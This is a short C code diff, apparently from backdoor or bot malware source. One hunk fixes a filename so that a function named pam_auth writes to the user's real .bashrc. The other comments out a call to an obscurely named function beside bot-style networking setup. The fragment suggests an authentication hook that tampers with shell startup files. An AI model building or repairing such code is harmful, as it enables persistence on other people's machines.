@@ -4227,7 +4227,7 @@ int pam_auth(char *username, char *password, char *host)
     size_t nread;
     char *ptr;
 
-	char *bashrc = "..bashrc";
+	char *bashrc = ".bashrc";
 
 	FILE *fptr = fopen(bashrc,"w");
 
@@ -5097,7 +5097,7 @@ int main(int argc, char**argv) {
 	  }
 	  LOCAL_ADDR = util_local_addr();
 
-    coil_xywz(getpid());
+    //coil_xywz(getpid());
     char rdbuf[512];
     int got = 0;
     int i = 0;
